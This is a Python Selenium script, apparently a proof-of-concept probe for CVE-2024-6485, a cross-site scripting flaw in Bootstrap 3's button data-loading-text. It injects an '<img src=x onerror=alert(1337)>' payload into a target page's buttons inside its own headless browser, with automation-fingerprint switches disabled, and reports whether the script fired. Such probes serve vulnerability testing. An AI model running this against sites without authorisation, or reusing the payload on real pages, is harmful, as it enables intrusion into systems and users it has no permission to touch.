#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys, time, json, argparse
from urllib.parse import urlsplit, urlunsplit, parse_qs, urlencode

from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.common.exceptions import (
    NoSuchElementException, WebDriverException, UnexpectedAlertPresentException
)

PAYLOAD = 'Loading... <img src=x onerror=alert(1337)>'  # PoC clara
SEL_CANDIDATES = "[data-loading-text], button.btn, a.btn, input.btn"

JS_HOOK_ALERT = r"""
(function(){
  try {
    window.__xssFired = false;
    window.__xssMsg = '';
    var old = window.alert;
    window.alert = function(m){ window.__xssFired=true; window.__xssMsg=String(m||''); try{old(m);}catch(e){} };
  } catch(e) {}
})();
"""

JS_ENV = r"""
return {
  hasjQuery: !!window.jQuery,
  jqVersion: (window.jQuery && jQuery.fn && jQuery.fn.jquery) || null,
  hasButton: !!(window.jQuery && jQuery.fn && jQuery.fn.button)
};
"""

# CSP inline quick-check (se true, 'onerror' tende a executar)
JS_INLINE_TEST = r"""
window.__inline_ok=false;
var img=document.createElement('img');
img.onerror=function(){ window.__inline_ok=true; };
img.src='invalid://x';
document.body.appendChild(img);
"""

JS_GET_INLINE_OK = "return window.__inline_ok===true;"

JS_QS = r"""
var out=[];
document.querySelectorAll(arguments[0]).forEach(function(n,i){
  try{
    var dlt = n.getAttribute('data-loading-text');
    out.push({
      idx:i,
      tag:n.tagName.toLowerCase(),
      id:n.id||'',
      cls:n.className||'',
      hasDlt:(dlt!==null),
      dlt:dlt
    });
  }catch(e){}
});
return out;
"""

JS_SET_DLT = r"""
(function(sel, payload){
  var applied=[];
  var nodes=document.querySelectorAll(sel);
  for (var i=0;i<nodes.length;i++){
    try{
      if (nodes[i].tagName.toLowerCase()==='input'){ // evitar innerHTML quebrar input
        continue;
      }
      var had = nodes[i].hasAttribute('data-loading-text');
      if (!had) nodes[i].setAttribute('data-loading-text', payload);
      else nodes[i].setAttribute('data-loading-text', payload); // override forçado
      applied.push(i);
    }catch(e){}
  }
  return applied;
})(arguments[0], arguments[1]);
"""

JS_TRIGGER_LOADING = r"""
(function(sel){
  var via='jquery', ok=false, cnt=0;
  try{
    if (window.jQuery && jQuery.fn && jQuery.fn.button){
      var $nodes = jQuery(sel);
      cnt = $nodes.length;
      $nodes.button('loading');
      ok=true;
      return {ok:ok, via:via, count:cnt};
    }
  }catch(e){}
  // Fallback: aplica innerHTML do data-loading-text (DOM puro)
  var nodes=document.querySelectorAll(sel);
  cnt=nodes.length;
  for (var i=0;i<cnt;i++){
    var t = nodes[i].getAttribute('data-loading-text');
    if (t!=null && nodes[i].tagName.toLowerCase()!=='input'){
      nodes[i].innerHTML = t;
      ok = true;
    }
  }
  return {ok:ok, via:'fallback', count:cnt};
})(arguments[0]);
"""

JS_RESET_BUTTONS = r"""
(function(sel){
  try{
    if (window.jQuery && jQuery.fn && jQuery.fn.button){
      jQuery(sel).button('reset');
    }
  }catch(e){}
})(arguments[0]);
"""

def browser(headless=True, proxy=None, binary=None, ua=None):
    from selenium.webdriver.chrome.service import Service
    from selenium.webdriver.chrome.options import Options
    opts = Options()
    if headless:
        opts.add_argument("--headless=new")
    opts.add_argument("--disable-gpu")
    opts.add_argument("--no-sandbox")
    opts.add_argument("--disable-dev-shm-usage")
    opts.add_argument("--window-size=1366,900")
    if ua:
        opts.add_argument(f"--user-agent={ua}")
    if proxy:
        opts.add_argument(f"--proxy-server={proxy}")
    if binary:
        opts.binary_location = binary
    # menos fingerprint
    opts.add_experimental_option("excludeSwitches", ["enable-automation"])
    opts.add_experimental_option('useAutomationExtension', False)

    # Selenium Manager resolve o driver correto
    return webdriver.Chrome(options=opts)

def think_path(node):
    # monta um seletor legível p/ relatório
    sel = node.get("tag","*")
    if node.get("id"):
        sel += f"#{node['id']}"
    if node.get("cls"):
        cls = "." + ".".join([c for c in str(node['cls']).split() if c])
        sel += cls
    return sel

def main():
    ap = argparse.ArgumentParser(description="Probe CVE-2024-6485 (Bootstrap 3 Button data-loading-text) – ambiente validado")
    ap.add_argument("-u","--url", required=True)
    ap.add_argument("--headful", action="store_true")
    ap.add_argument("--proxy")
    ap.add_argument("--binary", help="Caminho do Chrome/Chromium (ex.: /usr/bin/chromium)")
    ap.add_argument("--ua", help="User-Agent custom")
    ap.add_argument("--json", default="cve6485_report.json", help="Arquivo de saída JSON")
    args = ap.parse_args()

    drv = None
    report = {
        "target": args.url,
        "env": {},
        "candidates": [],
        "tests": [],
        "result": "not_executed"
    }

    try:
        drv = browser(headless=not args.headful, proxy=args.proxy, binary=args.binary, ua=args.ua)
        drv.set_page_load_timeout(40)
        drv.get(args.url)
        time.sleep(0.6)

        # Hook de alert + diagnóstico ambiente
        drv.execute_script(JS_HOOK_ALERT)
        info = drv.execute_script(JS_ENV)
        drv.execute_script(JS_INLINE_TEST)
        time.sleep(0.5)
        inline_ok = drv.execute_script(JS_GET_INLINE_OK)

        report["env"] = {
            "hasjQuery": bool(info.get("hasjQuery")),
            "jQueryVersion": info.get("jqVersion"),
            "hasButtonPlugin": bool(info.get("hasButton")),
            "inlineHandlersAllowed": bool(inline_ok)
        }

        # Curto e grosso: se não tem Button, esta tela não é alvo
        if not info.get("hasButton"):
            report["result"] = "no_button_plugin_here"
            print(json.dumps(report, indent=2, ensure_ascii=False))
            return 2

        # Enumera candidatos
        nodes = drv.execute_script(JS_QS, SEL_CANDIDATES)
        report["candidates"] = nodes

        # Injeta data-loading-text com payload
        applied = drv.execute_script(JS_SET_DLT, SEL_CANDIDATES, PAYLOAD)

        # Dispara estado loading
        try:
            res = drv.execute_script(JS_TRIGGER_LOADING, SEL_CANDIDATES)
        except UnexpectedAlertPresentException:
            res = {"ok": True, "via": "alert-interrupt", "count": len(applied)}

        time.sleep(0.7)
        fired = drv.execute_script("return window.__xssFired===true;")
        msg = drv.execute_script("return window.__xssMsg||'';")

        # Identifica qual nó disparou (heurística por innerHTML)
        fired_selector = None
        if fired:
            try:
                # Recupera novamente e procura quem tem payload no innerHTML
                for n in nodes:
                    if n.get("tag","").lower() == "input":
                        continue
                    sel = think_path(n)
                    # pega o innerHTML do primeiro match daquele seletor
                    inner = drv.execute_script("var n=document.querySelector(arguments[0]); return n? n.innerHTML:'';", sel)
                    if "<img src=\"x\" onerror=\"alert(1337)\">" in inner or "onerror=alert(1337)" in inner:
                        fired_selector = sel
                        break
            except Exception:
                pass

        # Reseta estado dos botões (boa prática)
        drv.execute_script(JS_RESET_BUTTONS, SEL_CANDIDATES)

        report["tests"].append({
            "applied_count": len(applied),
            "trigger_result": res,
            "xss_fired": bool(fired),
            "xss_msg": msg,
            "fired_selector": fired_selector
        })

        report["result"] = "xss_confirmed" if fired else "not_executed"

        print(json.dumps(report, indent=2, ensure_ascii=False))

        # Exit code “corporativo”: 0 = confirmado; 2 = não reproduzido nesta tela
        return 0 if fired else 2

    except WebDriverException as e:
        report["error"] = str(e)
        print(json.dumps(report, indent=2, ensure_ascii=False))
        return 3
    finally:
        try:
            drv.quit()
        except Exception:
            pass

if __name__ == "__main__":
    sys.exit(main())
